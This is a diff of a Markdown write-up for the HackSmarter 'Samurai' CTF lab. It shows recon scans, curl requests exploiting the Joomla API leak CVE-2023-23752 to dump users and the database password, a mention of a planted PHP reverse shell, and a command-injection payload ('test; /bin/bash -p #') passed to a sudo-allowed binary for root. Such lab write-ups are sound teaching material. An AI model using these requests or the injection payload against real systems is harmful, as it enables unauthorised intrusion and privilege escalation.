@@ -4,21 +4,71 @@ author: Daults
 date: 
 ---
 
+{{< lead >}}
+HackSmarter's Samurai chains an unauthenticated Joomla API leak (CVE-2023-23752) into admin access, a PHP shell, and root through a command-injection flaw in a sudo-allowed binary.
+{{< /lead >}}
+
+{{< badge >}}HackSmarter{{< /badge >}} {{< badge >}}Joomla 4.2.5{{< /badge >}} {{< badge >}}Linux{{< /badge >}}
+
 ## Objective
 
-As part of a penetration test, your team identified an interesting 
-web server. Your task is to enumerate the target, establish an initial 
+As part of a penetration test, your team identified an interesting
+web server. Your task is to enumerate the target, establish an initial
 foothold, and escalate privileges to root.
 
 ### Initial Access
 
 You have been provisioned VPN access to the client environment. No initial credentials are provided.
 
+## Attack Path 
+
+{{< accordion mode="collapse" separated=true >}}
+{{< accordionItem title="Attack Path" icon="code" >}}
+
+{{< mermaid >}}
+
+---
+config:
+
+    treeView:
+    showIcons: true
+---
+treeView-beta
+    recon/
+        nmap ## SSH 22 and Apache 2.4.52 on port 80
+        nikto ## Admin page and exposed shell history files
+        joomscan ## Joomla 4.2.5 identified
+    initial-access/
+        CVE-2023-23752 :::highlight ## Unauthenticated Joomla API leak
+        users.json ## Username: miyamoto
+        config.json ## Database password exposed
+        admin-login ## Same password reused for the admin panel
+    foothold/
+        index.php :::highlight ## Admin template edited to inject a PHP reverse shell
+        www-data ## Shell received on the listener
+    privilege-escalation/
+        sudo-l ## DbMaria allowed as root without a password
+        DbMaria :::highlight ## Command injection in its argument
+        root.txt ## Root shell obtained
+{{< /mermaid >}}
+
+{{< /accordionItem >}}
+{{< /accordion >}}
+
 ---
 
-# Enumeration
+## Enumeration
 
-## Nmap
+### Nmap
+
+```bash {hl_lines=[3]}
+
+    22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+    80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
+```
+
+{{< accordion mode="collapse" separated=true >}}
+{{< accordionItem title="Full Nmap output" icon="code" >}}
 
 ```bash
 
@@ -275,11 +325,19 @@ Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds
            Raw packets sent: 68 (4.684KB) | Rcvd: 40 (3.056KB)
 ```
 
-## Found Joomla login page at `http://samurai.hsm/administrator/`
+{{< /accordionItem >}}
+{{< /accordion >}}
 
-!image.png
+## Found Joomla login page
+
+`http://samurai.hsm/administrator/`
+
+![Joomla login page](joomla-login.png)
 
 ## Nikto Scan
+
+{{< accordion mode="collapse" separated=true >}}
+{{< accordionItem title="Nikto Scan" icon="code" >}}
 
 ```bash
 ┌──(dfaults㉿kali)-[~/ctf/hacksmarter/samurai]
@@ -331,12 +389,14 @@ Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
+{{< /accordionItem >}}
+{{< /accordion >}}
 
-# Version Enumeration with Joomscan
+## Version Enumeration with Joomscan
 
 Joomscan is a tool for identifying the Joomla version installed on a web server. To use it it’s as simple as `joomscan -u example.site` and watch it give back the version.
 
-```bash
+```bash {hl_lines=[21]}
 
     ____  _____  _____  __  __  ___   ___    __    _  _ 
    (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
@@ -361,7 +421,7 @@ Processing http://samurai.hsm/ ...
 
 ```
 
-# User Enumeration via `CVE-**2023-23752**`
+## User Enumeration via CVE-2023-23752
 
 https://www.exploit-db.com/exploits/51334
 
@@ -369,7 +429,8 @@ Manually checking, we can curl the endpoint the script is using to get the infor
 
 ### User Enumeration
 
-```bash
+```bash {hl_lines=[19]}
+
 ┌──(dfaults㉿kali)-[~/ctf/hacksmarter/samurai]
 └─$ curl -i http://samurai.hsm/api/index.php/v1/users?public=true
 
@@ -388,11 +449,12 @@ Content-Length: 389
 Content-Type: application/vnd.api+json; charset=utf-8
 
 {"links":{"self":"http:\/\/samurai.hsm\/api\/index.php\/v1\/users?public=true"},"data":[{"type":"users","id":"769","attributes":{"id":769,"name":"Oda","username":"Miyamoto","email":"oda@local.local","block":0,"sendEmail":1,"registerDate":"2026-03-06 09:02:33","lastvisitDate":null,"lastResetTime":null,"resetCount":0,"group_count":1,"group_names":"Super Users"}}],"meta":{"total-pages":1}}
+
 ```
 
 ### Password Dump
 
-```bash
+```bash {hl_lines=[18]}
 ┌──(dfaults㉿kali)-[~/ctf/hacksmarter/samurai]
 └─$ curl -i http://samurai.hsm/api/index.php/v1/config/application?public=true 
 
@@ -426,11 +488,11 @@ Once we’re inside the dashboard we take advantage of the currently running tem
 
 After looking around for a bit, we find our user flag which is in an unconventional place (not in the home folder). Then we proceed to escalate our privileges by running `sudo -l` this will help us see if we can run anything as sudo without a password.
 
-# Shell as root user
+## Shell as root user
 
 Once you find the file we can run as root without a password we can run the following command to get into the root shell
 
-```bash
+```bash {hl_lines=[1]}
 www-data@streetcoder:/opt/backup$ sudo ./DbMaria 'test; /bin/bash -p #'
 
 /*M!999999\- enable the sandbox mode */ 
